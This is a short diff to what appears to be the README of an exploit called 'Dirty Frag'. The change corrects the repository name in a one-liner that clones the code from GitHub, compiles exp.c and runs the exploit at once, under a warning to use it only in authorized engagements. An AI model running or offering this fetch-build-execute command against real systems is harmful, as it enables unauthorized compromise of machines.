@@ -15,7 +15,7 @@ For detailed technical information and the timeline, see here.
 
 Exploiting : Only run in authorized engagements !!
 
-Oneliner: git clone https://github.com/Minime794/Dirty-Frag.git && cd dirtyfrag && gcc -O0 -Wall -o exp exp.c -lutil && ./exp
+Oneliner: git clone https://github.com/Minime794/DirtyFrag.git && cd dirtyfrag && gcc -O0 -Wall -o exp exp.c -lutil && ./exp
 
 Step by Step :
 
